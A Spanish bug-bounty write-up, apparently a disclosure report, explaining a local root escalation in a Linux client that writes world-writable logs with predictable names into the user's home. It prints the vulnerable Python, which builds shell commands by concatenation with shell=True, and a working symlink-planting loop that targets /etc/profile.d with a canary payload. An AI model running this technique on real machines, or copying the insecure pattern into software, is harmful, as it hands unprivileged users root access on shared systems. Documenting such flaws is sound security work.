---
title:       "Escalada local a root por enlace simbólico: el log que un proceso privilegiado deja en tu carpeta"
summary:     "Un servicio que corre como root guardaba su registro en el directorio del usuario que lo lanzaba, con un nombre predecible, y le ponía permisos de escritura para todo el mundo. Eso es todo lo que hace falta para crear cualquier fichero del sistema y que lo ejecute root."
date:        2026-11-05 16:45:00 +0100
lang:        es
ref:         escalada-symlink-log-root
image:       /assets/img/og/escalada-symlink-log-root-es.png

severity:    high
cvss:        "7.8"
cvss_vector: "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
cwe:         "CWE-59 · CWE-732"
vuln_class:  "Control de acceso"
target_type: "Cliente de escritorio (Linux)"
platform:    "YesWeHack"
status:      "Reportado"
tags:        [escalada-de-privilegios, linux, symlink, toctou, root, permisos]

takeaways:
  - "Si un proceso root escribe dentro de una carpeta que controla un usuario normal, ese usuario decide qué fichero se escribe."
  - "`touch` y `chmod` **siguen** los enlaces simbólicos. La protección del kernel solo cubre directorios tipo `/tmp`, no tu casa."
  - "«Puedo ejecutar un comando concreto como root» y «soy root» son cosas distintas. Convertir lo primero en lo segundo es escalada de privilegios."
  - "No hace falta ganar una carrera si el nombre del fichero es predecible: plantas el enlace y esperas."
---

No hay inyección, ni red, ni criptografía. Hay un programa que escribe su fichero de
registro en el sitio equivocado.

El punto de partida es una regla de `sudo` **correcta**, de las que se recomiendan: en vez
de dar permisos completos, das permiso para una cosa concreta.

```
usuario ALL=(root) NOPASSWD: /usr/bin/cliente
```

La frontera que dibuja es clara: *puedes ejecutar ese programa como root*, no *eres root*.
Todo el fallo consiste en borrar esa frontera. Y hay que decirlo porque es la objeción que
me esperaba del triador: podía ejecutar **un** programa; ahora puede ejecutar cualquiera.

## Las tres líneas

```python
DIR_LOGS = '/home/' + (os.getenv('SUDO_USER') or os.getenv('USER')) + '/.cliente/logs'

fichero_log = DIR_LOGS + '/log-' + str(int(time.time())) + '.log'
ejecutar('touch ' + fichero_log + '; chmod 666 ' + fichero_log)

def ejecutar(comando):
    subprocess.Popen(comando, shell=True)
```

Tres cosas, todas a la vista:

1. **El proceso es root pero escribe en una carpeta del usuario.** Usa `SUDO_USER` a
   propósito, para que puedas leer tus propios logs. La intención es buena; el efecto es
   que un proceso todopoderoso escribe en territorio que tú controlas.
2. **El nombre es predecible**: la hora en segundos, nada aleatorio.
3. **Le pone `chmod 666`**: escritura para todo el mundo.

## El enlace simbólico

Un enlace simbólico no contiene datos, contiene una dirección. Lo que importa es quién lo
sigue: `touch` y `chmod` lo siguen. Si pongo uno donde tú vas a escribir, y tú eres root,
escribes donde yo te diga.

<figure>
  <img src="{{ '/assets/img/writeups/escalada-symlink/01-enlace-simbolico.svg' | relative_url }}"
       alt="Diagrama: el usuario planta un enlace simbólico en la ruta predecible del registro y el proceso root, al escribir ahí, acaba creando un fichero del sistema con permisos para todos">
  <figcaption>El proceso root escribe en una ruta que tú controlas. Tú decides a dónde apunta.</figcaption>
</figure>

<div class="note" markdown="1">
**¿Y la protección del kernel?** `protected_symlinks` solo actúa en directorios compartidos
y con el bit *sticky*, del estilo de `/tmp`. La carpeta personal del usuario no es uno de
esos. Lo comprobé con las dos opciones del kernel activadas, que es el valor por defecto de
cualquier distribución moderna.
</div>

## El ataque

El atacante es una cuenta local sin privilegios, con la única regla de `sudo` de arriba.

```bash
# 1 · un enlace por segundo en la ruta predecible
while true; do
    ln -sf /etc/profile.d/x.sh "$HOME/.cliente/logs/log-$(date +%s).log"
    sleep 1
done
```

```
# 2 · esperar. No es una carrera: la ventana son minutos.

# 3 · el usuario legítimo conecta. Root ejecuta:
#     touch <ruta>; chmod 666 <ruta>
#     ...sigue el enlace y crea /etc/profile.d/x.sh con dueño root y permiso 666
```

```bash
# 4 · escribir en ese fichero, que ahora es de root pero escribible por cualquiera
echo 'id > /tmp/CANARIO' >> /etc/profile.d/x.sh
```

Los scripts de `/etc/profile.d/` se ejecutan cada vez que alguien abre una sesión, root
incluido. Y no hay que ganar ninguna carrera: como el nombre depende solo de la hora en
segundos, planto un enlace por segundo y espero.

Aparte del ataque: **cada registro que escribe ese programa queda legible y escribible por
todos los usuarios de la máquina**. Eso ya es un problema en cualquier equipo compartido.

## Dónde paré

No apunté el enlace a `/etc/shadow`, ni a `/etc/sudoers.d/`, ni a `/etc/ld.so.preload`.
Apuntaba a un canario con mi propio nombre, que borré en cuanto quedó demostrado. Máquina
virtual mía, cuentas mías, cliente desinstalado al terminar. Para demostrar que puedo crear
cualquier fichero como root basta con crear uno inofensivo.

## Impacto

<div class="impact" markdown="1">
**Impacto.** Cualquier usuario local sin privilegios, en una máquina donde exista esa regla
de `sudo`, obtiene **ejecución como root**: lectura de `/etc/shadow`, persistencia,
modificación de binarios del sistema y acceso a los ficheros de todos los demás usuarios.
El escenario natural de este cliente son equipos compartidos —estaciones de trabajo, saltos
de administración, máquinas de laboratorio—, que es exactamente donde dar un permiso
acotado en vez de root completo es la práctica **correcta**. El fallo castiga precisamente
a quien hizo bien su trabajo.
</div>
